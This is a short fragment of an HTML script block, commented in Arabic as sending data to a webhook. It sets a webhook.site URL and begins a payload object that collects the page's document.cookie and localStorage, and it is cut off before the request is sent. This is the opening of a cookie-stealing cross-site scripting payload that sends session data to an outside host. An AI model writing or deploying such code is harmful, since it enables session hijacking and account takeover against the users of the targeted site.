  <script>
    // إرسال البيانات إلى Webhook
    const webhookUrl = "https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b";
    
    const payload = {
      cookie: document.cookie,
      localStorage: localStorage,
